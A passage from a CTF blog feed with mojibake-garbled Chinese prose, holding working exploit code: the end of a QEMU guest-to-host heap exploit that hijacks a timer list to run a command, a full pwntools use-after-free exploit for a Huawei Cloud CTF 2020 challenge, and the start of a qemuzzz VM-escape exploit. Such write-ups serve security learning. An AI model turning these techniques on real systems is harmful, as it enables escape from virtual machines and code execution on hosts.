class="hljs-keyword">struct</span> sockaddr *)&amp;recv_sin, &amp;sock_addr_len)) &lt;= <span class="hljs-number">0</span>)&#123;<br>            status = errno;<br>            <span class="hljs-keyword">if</span>(status == EAGAIN)&#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] No replay within %li seconds. ---leak\n&quot;</span>,wait.tv_sec);<br>                <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                perror(<span class="hljs-string">&quot;[*] recvfrom() failed&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>            &#125;<br>        &#125;<br>        <br>        <span class="hljs-keyword">if</span>((((recv_buf[<span class="hljs-number">12</span>] &lt;&lt; <span class="hljs-number">8</span>) + (recv_buf[<span class="hljs-number">13</span>])) == ETH_P_IP )&amp;&amp;<br>            (recv_ip-&gt;ip_p == IPPROTO_ICMP) &amp;&amp;<br>            (recv_icmp-&gt;icmp_type == ICMP_ECHOREPLY))&#123;<br>                (<span class="hljs-type">void</span>)gettimeofday(&amp;t2,&amp;tz);<br>                tt = (<span class="hljs-type">double</span>)(t2.tv_sec - t1.tv_sec) * <span class="hljs-number">1000.0</span> + (<span class="hljs-type">double</span>)(t2.tv_usec - t1.tv_usec)/<span class="hljs-number">1000.0</span>;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%g ms (%i bytes recvived)\n&quot;</span>,tt,recv_size);<br>                <span class="hljs-keyword">if</span>(recv_size &lt; <span class="hljs-number">0x200</span>)&#123;<br>                    <span class="hljs-keyword">continue</span>;<br>                &#125;<br>                <span class="hljs-keyword">break</span>;<br>        &#125;   <br>    &#125;<br><br>    <span class="hljs-comment">// for(int i = 0; i &lt; 0x200 / 8; i = i + 2)&#123;</span><br>    <span class="hljs-comment">//     printf(&quot;%#lx %#lx\n&quot;, *(uint64_t*)(recv_buf + i * 8), *(uint64_t*)(recv_buf + (i+1) * 8));</span><br>    <span class="hljs-comment">// &#125;</span><br>    heap_base = *(<span class="hljs-type">uint64_t</span>*)(recv_buf + <span class="hljs-number">13</span> * <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xffffffffff000000</span>;<br>    elf_base = *(<span class="hljs-type">uint64_t</span>*)(recv_buf + <span class="hljs-number">16</span> * <span class="hljs-number">8</span>) - <span class="hljs-number">0x463099</span>;<br>    main_thread_heap_base = *(<span class="hljs-type">uint64_t</span>*)(recv_buf + <span class="hljs-number">17</span> * <span class="hljs-number">8</span>) - <span class="hljs-number">0x132d10</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] leak_heap_base_is %#lx\n&quot;</span>, heap_base);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] leak_elf_base_is %#lx\n&quot;</span>, elf_base);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] leak_main_thread_heap_addr_is %#lx\n&quot;</span>, main_thread_heap_base);<br><br><br>    <span class="hljs-built_in">free</span>(payload);<br>    <span class="hljs-built_in">free</span>(write_data);<br>    close(sd);<br>    close(recv_sd);<br>&#125;<br><br><span class="hljs-type">uint8_t</span> buf[IP_MAXPACKET];<br><span class="hljs-type">char</span> cmd[<span class="hljs-number">0x40</span>] = <span class="hljs-string">&quot;gnome-calculator&quot;</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">//system(&quot;ip link set dev enp0s3 mtu 9000&quot;);</span><br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> eth_frame[] =<br>        <span class="hljs-string">&quot;\x52\x56\x00\x00\x00\x02\x52\x54\x00\x12\x34\x56\x08\x00&quot;</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">icmp</span> *<span class="hljs-title">icmphdr</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ip</span> *<span class="hljs-title">iphdr</span>;</span><br>    <br>    <span class="hljs-type">char</span> src_ip[INET_ADDRSTRLEN], dst_ip[INET_ADDRSTRLEN];<br>    <span class="hljs-type">int</span> status;<br>    <span class="hljs-built_in">memcpy</span>(buf, eth_frame, ETH_HDRLEN);<br>    iphdr = (<span class="hljs-keyword">struct</span> ip *)(buf + ETH_HDRLEN);<br>    <span class="hljs-built_in">strcpy</span>(src_ip, <span class="hljs-string">&quot;10.0.2.15&quot;</span>);<br>    <span class="hljs-built_in">strcpy</span>(dst_ip, <span class="hljs-string">&quot;10.0.2.2&quot;</span>);<br>    iphdr-&gt;ip_hl = IP4_HDRLEN / <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint32_t</span>);<br>    iphdr-&gt;ip_v = <span class="hljs-number">4</span>;<br>    iphdr-&gt;ip_tos = <span class="hljs-number">0</span>;<br>    iphdr-&gt;ip_len = ICMP_HDRLEN;<br>    iphdr-&gt;ip_id = <span class="hljs-number">0xcdcd</span>;<br>    <span class="hljs-comment">// Zero (1 bit)</span><br>    <span class="hljs-comment">// Do not fragment flag (1 bit)</span><br>    <span class="hljs-comment">// More fragments following flag (1 bit)</span><br>    <span class="hljs-comment">// Fragmentation offset (13 bits)</span><br>    iphdr-&gt;ip_off = ((<span class="hljs-number">0</span> &lt;&lt; <span class="hljs-number">15</span>) + (<span class="hljs-number">0</span> &lt;&lt; <span class="hljs-number">14</span>) + (<span class="hljs-number">0</span> &lt;&lt; <span class="hljs-number">13</span>) + (<span class="hljs-number">0</span> &gt;&gt; <span class="hljs-number">3</span>));<br>    iphdr-&gt;ip_ttl = <span class="hljs-number">255</span>;<br>    iphdr-&gt;ip_p = IPPROTO_ICMP;<br>    inet_pton(AF_INET, src_ip, &amp;(iphdr-&gt;ip_src));<br>    inet_pton(AF_INET, dst_ip, &amp;(iphdr-&gt;ip_dst));<br>    iphdr-&gt;ip_sum = <span class="hljs-number">0</span>;<br>    iphdr-&gt;ip_sum = checksum((<span class="hljs-type">uint16_t</span> *)&amp;iphdr, IP4_HDRLEN);<br><br>    icmphdr = (<span class="hljs-keyword">struct</span> icmp *)(buf + ETH_HDRLEN + IP4_HDRLEN);<br>    icmphdr-&gt;icmp_type = <span class="hljs-number">8</span>;<br>    icmphdr-&gt;icmp_code = <span class="hljs-number">0</span>;<br>    icmphdr-&gt;icmp_id = <span class="hljs-number">0x1234</span>;<br>    icmphdr-&gt;icmp_seq = <span class="hljs-number">0</span>;<br>    icmphdr-&gt;icmp_cksum = <span class="hljs-number">0</span>;<br>    icmphdr-&gt;icmp_cksum = icmp4_checksum(*icmphdr, buf, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-type">int</span> write_data_len = ETH_HDRLEN + IP4_HDRLEN + ICMP_HDRLEN;<br><br>    <span class="hljs-comment">//puts(&quot;[*]STEP 1: Write the icmp_data to heap&quot;);</span><br>    <span class="hljs-comment">//puts(&quot;[*] Start First Spray&quot;);</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x200</span>; ++i)&#123;<br>        spray(<span class="hljs-number">0xaabb</span> + i, <span class="hljs-number">0x5dc</span>);<br>        <span class="hljs-comment">//printf(&quot;Spray time %d.\n&quot;,i + 1);</span><br>    &#125;<br>    write_anywhere(<span class="hljs-number">0xae0</span> - <span class="hljs-number">0x400</span>, <span class="hljs-number">3</span>, buf, write_data_len);<br><br>    <span class="hljs-comment">//puts(&quot;[*]STEP 2: Recv icmp_package and leak addr&quot;);</span><br>    <span class="hljs-comment">//puts(&quot;[*] Start Second Spray&quot;);</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x20</span>; ++i)&#123;<br>        spray(<span class="hljs-number">0xccdd</span> + i, <span class="hljs-number">0x5dc</span>);<br>        <span class="hljs-comment">//printf(&quot;Spray time %d.\n&quot;,i + 1);</span><br>    &#125;<br>    leak(<span class="hljs-number">0xae0</span> + ETH_HDRLEN + IP4_HDRLEN, <span class="hljs-number">3</span>);<br><br>    <span class="hljs-type">size_t</span> system_plt = elf_base + <span class="hljs-number">0x2a7390</span>;<br>    <span class="hljs-type">size_t</span> main_loop_tlg = elf_base + <span class="hljs-number">0x100d340</span>;<br><br>    <span class="hljs-comment">//puts(&quot;[*]STEP 3: Hijack the main_loop_tlg&quot;);</span><br>    <span class="hljs-type">size_t</span> fake_timerlist_addr = heap_base + <span class="hljs-number">0x1020</span>;<br>    <span class="hljs-type">size_t</span> fake_timerlist[<span class="hljs-number">14</span>];<br>    <span class="hljs-type">int</span> j = <span class="hljs-number">0</span>;<br>    fake_timerlist[j++] = main_loop_tlg + <span class="hljs-number">0x20</span>;<br>    fake_timerlist[j++] = <span class="hljs-number">0</span>;<br>    fake_timerlist[j++] = <span class="hljs-number">0</span>;<br>    fake_timerlist[j++] = <span class="hljs-number">0</span>;<br>    fake_timerlist[j++] = <span class="hljs-number">0</span>;<br>    fake_timerlist[j++] = <span class="hljs-number">0</span>;<br>    fake_timerlist[j++] = <span class="hljs-number">0</span>;<br>    fake_timerlist[j++] = <span class="hljs-number">0x100000000</span>;<br>    fake_timerlist[j++] = heap_base + <span class="hljs-number">0x1020</span> + <span class="hljs-number">0x70</span>;<br>    fake_timerlist[j++] = <span class="hljs-number">0</span>;<br>    fake_timerlist[j++] = main_loop_tlg;<br>    fake_timerlist[j++] = elf_base + <span class="hljs-number">0x2f8a34</span>;<br>    fake_timerlist[j++] = <span class="hljs-number">0</span>;<br>    fake_timerlist[j++] = <span class="hljs-number">0x100000000</span>;<br><br>    <span class="hljs-type">size_t</span> fake_timer[<span class="hljs-number">8</span>];<br>    <span class="hljs-type">size_t</span> cmd_addr = heap_base + <span class="hljs-number">0x1020</span> + <span class="hljs-number">0x70</span> + <span class="hljs-number">0x40</span>;<br>    j = <span class="hljs-number">0</span>;<br>    fake_timer[j++] = <span class="hljs-number">0xffffffffffffffff</span>;<br>    fake_timer[j++] = heap_base + <span class="hljs-number">0x1020</span>;<br>    fake_timer[j++] = system_plt;<br>    fake_timer[j++] = cmd_addr;<br>    fake_timer[j++] = <span class="hljs-number">0</span>;<br>    fake_timer[j++] = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-built_in">memcpy</span>(buf, fake_timerlist, <span class="hljs-number">0x70</span>);<br>    <span class="hljs-built_in">memcpy</span>(buf + <span class="hljs-number">0x70</span>, fake_timer, <span class="hljs-number">0x40</span>);<br>    <span class="hljs-built_in">memcpy</span>(buf + <span class="hljs-number">0x70</span> + <span class="hljs-number">0x40</span>, cmd, <span class="hljs-number">0x40</span>);<br><br>    <span class="hljs-comment">//puts(&quot;[*] Start Third Spray&quot;);</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x20</span>; ++i)&#123;<br>        spray(<span class="hljs-number">0xeeff</span> + i, <span class="hljs-number">0x5dc</span>);<br>        <span class="hljs-comment">//printf(&quot;Spray time %d.\n&quot;,i + 1);</span><br>    &#125;<br><br>    write_anywhere(fake_timerlist_addr - <span class="hljs-number">0x400</span>, <span class="hljs-number">8</span>, buf, <span class="hljs-number">0xf0</span>);<br><br>    <span class="hljs-comment">//puts(&quot;[*] Start Fourth Spray&quot;);</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x30</span>; ++i)&#123;<br>        spray(<span class="hljs-number">0xffee</span> + i, <span class="hljs-number">0x5dc</span>);<br>        <span class="hljs-comment">//printf(&quot;Spray time %d.\n&quot;,i + 1);</span><br>    &#125;<br><br>    <span class="hljs-built_in">memcpy</span>(buf, &amp;fake_timerlist_addr, <span class="hljs-number">8</span>);<br>    write_anywhere(main_loop_tlg - <span class="hljs-number">0x400</span>, <span class="hljs-number">8</span>, buf, <span class="hljs-number">8</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>æœ€åæ•ˆæœå¦‚ä¸‹ï¼š</p><img src="/img/20/Screenshot 2023-10-06 205655.png" style="zoom: 67%;" />]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>åä¸ºäº‘ctf2020</title>
    <link href="/2023/09/25/hwctf2020/"/>
    <url>/2023/09/25/hwctf2020/</url>
    
    <content type="html"><![CDATA[<p>æœ€è¿‘ç ”ç©¶angråœ¨pwné¢˜ä¸­çš„åº”ç”¨ï¼Œå‘ç°åˆ°äº†2020å¹´åä¸ºäº‘ctfä¸­å°±æœ‰è¿™ç§ç±»å‹çš„é¢˜ï¼Œåæ¥å‘ç°è¿™åœºæ¯”èµ›ä¸­å…¶å®ƒé¢˜ç›®çš„å‡ºé¢˜ç‚¹ä¹Ÿå¾ˆæœ‰æ„æ€ï¼Œæ„Ÿè§‰ä¹Ÿæœ‰å¿…è¦å¤ç°ä¸€ä¸‹ã€‚</p><p>å‚è€ƒï¼š<a href="https://www.wolai.com/ctfhub/2ndDeVF7APBfhEndoMJccF">https://www.wolai.com/ctfhub/2ndDeVF7APBfhEndoMJccF</a>    ã€ <a href="https://github.com/huaweictf/xctf_huaweicloud-qualifier-2020">https://github.com/huaweictf/xctf_huaweicloud-qualifier-2020</a></p><p>â€‹                        </p><h3 id="CPP"><a href="#CPP" class="headerlink" title="CPP"></a>CPP</h3><p>C++çš„å †é¢˜ï¼Œæ²¡ç”¨STLè¿™äº›ä¸œè¥¿ï¼ˆå‡ºé¢˜äººå¤ªè‰¯å¿ƒäº†ï¼‰ï¼Œç™½ç»™çš„uafï¼Œå¯ä»¥ç›´æ¥æ³„æ¼åœ°å€ã€ä¿®æ”¹å †å†…å­˜</p><img src="/img/19/Screenshot 2023-09-24 203442.png" style="zoom: 67%;" /><p>â€‹                                     </p><p>å‰©ä¸‹çš„å°±æ²¡ä»€ä¹ˆå¯è¯´çš„äº†ï¼Œå®Œæ•´exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;chall&#x27;</span>)<br>libc = elf.libc<br>p = process(<span class="hljs-string">&#x27;./chall&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;0&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, content)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, content)<br><br>add(<span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>delete(<span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>, drop= <span class="hljs-literal">True</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>heap_addr = leak<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap_addr))<br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, p64(heap_addr - <span class="hljs-number">0x11c10</span>)[:<span class="hljs-number">7</span>])<br><br>add(<span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>, drop= <span class="hljs-literal">True</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc.address = leak - <span class="hljs-number">96</span> - <span class="hljs-number">0x10</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc.address))<br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, p64(leak)[:<span class="hljs-number">7</span>])<br><br>add(<span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>delete(<span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>delete(<span class="hljs-number">1</span>, p64(libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>])[:<span class="hljs-number">7</span>])<br>add(<span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;/bin/sh&#x27;</span>)<br>add(<span class="hljs-number">1</span>, p64(libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>])[:<span class="hljs-number">7</span>])<br>p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="game"><a href="#game" class="headerlink" title="game"></a>game</h3><p>ç›´æ¥å‚è€ƒä¸Šä¸€ç¯‡åšå®¢ï¼š<a href="https://xtxtn.github.io/2023/09/20/auto-pwn/#game-pwn">https://xtxtn.github.io/2023/09/20/auto-pwn/#game-pwn</a></p><p>â€‹                                                                   </p><h3 id="qemuzzz"><a href="#qemuzzz" class="headerlink" title="qemuzzz"></a>qemuzzz</h3><p>å¯ä»¥å•å­—èŠ‚æº¢å‡º</p><img src="/img/19/Screenshot 2023-09-25 101415.png" style="zoom: 67%;" /><p>v3å˜é‡æ˜¯è®¾å¤‡ç»“æ„ä½“çš„åŸºåœ°å€ï¼Œv7æ˜¯<code>cpu_physical_memory_rw</code>å‡½æ•°çš„åœ°å€ï¼›æº¢å‡ºåæ­£å¥½å¯ä»¥ä¿®æ”¹v3ï¼Œå°†v3å˜é‡æ”¹å¤§ä¸€ç‚¹ï¼Œè¿™æ ·ä»¥åä½¿ç”¨<code>cpu_physical_memory_rw</code>å‡½æ•°è¯»å†™æ•°æ®æ—¶å°±å¯ä»¥è¶Šç•Œè¯»å–ä¿¡æ¯ï¼Œè¿™æ ·å°±å¯ä»¥æ³„æ¼å †åœ°å€å’Œ<code>cpu_physical_memory_rw</code>å‡½æ•°åœ°å€ï¼Œæœ€åä¿®æ”¹ç›¸åº”çš„åœ°å€å³å¯ã€‚</p><p>æ³¨æ„ï¼šä½¿ç”¨<code>cpu_physical_memory_rw</code>å‡½æ•°å‰éƒ½æ˜¯ä»¥v3ä½œä¸ºåŸºåœ°å€ï¼Œå†å»é€šè¿‡å…¶åç§»æ‰¾åˆ°è¯»å†™ä¿¡æ¯ï¼Œä¿®æ”¹v3åå…ˆå‰è¯»å†™ä¿¡æ¯å°±ä½œåºŸäº†ã€‚</p><p>å®Œæ•´expï¼ˆUbuntu20ï¼‰:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;inttypes.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/io.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_SHIFT  12</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_SIZE   (1 &lt;&lt; PAGE_SHIFT)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PFN_PFN     ((1ull &lt;&lt; 55) - 1)</span><br><br><span class="hljs-type">void</span> * mmio;<br><br><span class="hljs-type">uint32_t</span> <span class="hljs-title function_">page_offset</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> addr)</span><br>&#123;<br>    <span class="hljs-comment">// addr &amp; 0xfff</span><br>    <span class="hljs-keyword">return</span> addr &amp; ((<span class="hljs-number">1</span> &lt;&lt; PAGE_SHIFT) - <span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-type">uint64_t</span> <span class="hljs-title function_">gva_to_gfn</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr)</span><br>&#123;<br>    <span class="hljs-type">uint64_t</span> pme, gfn;<br>    <span class="hljs-type">size_t</span> offset;<br>    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);<br>    <span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;open&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    offset = ((<span class="hljs-type">uintptr_t</span>)addr &gt;&gt; <span class="hljs-number">9</span>) &amp; ~<span class="hljs-number">7</span>;<br>    lseek(fd, offset, SEEK_SET);<br>    read(fd, &amp;pme, <span class="hljs-number">8</span>);<br>    <span class="hljs-keyword">if</span> (!(pme &amp; PFN_PRESENT))<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br>    gfn = pme &amp; PFN_PFN;<br>    <span class="hljs-keyword">return</span> gfn;<br>&#125;<br><br><span class="hljs-type">uint64_t</span> <span class="hljs-title function_">gva_to_gpa</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr)</span><br>&#123;<br>    <span class="hljs-type">uint64_t</span> gfn = gva_to_gfn(addr);<br>    assert(gfn != <span class="hljs-number">-1</span>);<br>    <span class="hljs-keyword">return</span> (gfn &lt;&lt; PAGE_SHIFT) | page_offset((<span class="hljs-type">uint64_t</span>)addr);<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">mmio_write</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> addr, <span class="hljs-type">uint64_t</span> val)</span>&#123;<br>    *(<span class="hljs-type">uint64_t</span>*)(mmio + addr) = val;<br>&#125;<br><br><span class="hljs-type">uint64_t</span> <span class="hljs-title function_">mmio_read</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> addr)</span>&#123; <br>    <span class="hljs-keyword">return</span> *(<span class="hljs-type">uint64_t</span> *)(mmio + addr); <br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">exec_cpu_physical_memory_rw</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> addr, <span class="hljs-type">uint16_t</span> offset, <span class="hljs-type">uint16_t</span> size)</span>&#123;<br>    mmio_write(<span class="hljs-number">0x20</span>, addr);<br>    mmio_write(<span class="hljs-number">0x10</span>, offset);<br>    mmio_write(<span class="hljs-number">0x18</span>, size);<br>    mmio_write(<span class="hljs-number">0x60</span>, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">xor_0x209</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> offset, <span class="hljs-type">uint16_t</span> size)</span>&#123;<br>    mmio_write(<span class="hljs-number">0x10</span>, offset);<br>    mmio_write(<span class="hljs-number">0x18</span>, size);<br>    mmio_write(<span class="hljs-number">0x50</span>, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">void</span> *buf;<br>    <span class="hljs-type">uint64_t</span> ptr_buf;<br>    <span class="hljs-type">int</span>  mmio_fd = open(<span class="hljs-string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | 